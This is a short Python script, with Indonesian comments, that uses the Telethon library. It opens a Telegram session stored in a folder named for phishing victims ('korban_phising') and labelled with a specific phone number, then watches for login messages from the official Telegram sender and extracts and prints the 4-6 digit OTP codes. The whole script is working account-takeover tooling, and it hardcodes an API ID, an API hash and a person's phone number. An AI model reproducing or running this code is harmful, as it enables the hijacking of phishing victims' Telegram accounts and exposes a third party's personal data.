from telethon import TelegramClient, events
import re

# Masukkan API_ID dan API_HASH dari my.telegram.org
API_ID = '22003089'
API_HASH = '2681d1c1b490e153681df7c0d6b20a3b'

PHONE_NUMBER = "korban_phising/+6285334703299_130225221600"  # Ganti dengan nomor Telegram Anda

# Inisialisasi Telethon Client
client = TelegramClient(PHONE_NUMBER, API_ID, API_HASH)

async def main():
    await client.connect()  # Ganti start() dengan connect()

    if not await client.is_user_authorized():
        print("❌ Akun belum terautentikasi! Silakan hapus session dan login ulang.")
        return

    print("✅ Berhasil Terhubung!")



    @client.on(events.NewMessage)  # Tangkap pesan masuk
    async def otp_handler(event):
        message = event.message.message
        sender = await event.get_sender()
        if(sender.first_name == "Telegram"):

            # Cek apakah pesan berisi kode OTP (4-6 digit)
            otp_match = re.search(r"\b\d{4,6}\b", message)
            if otp_match:
                otp_code = otp_match.group()
                print(f"📩 OTP Diterima dari {sender.first_name}: {otp_code}")

    await client.run_until_disconnected()

# Jalankan program
with client:
    client.loop.run_until_complete(main())
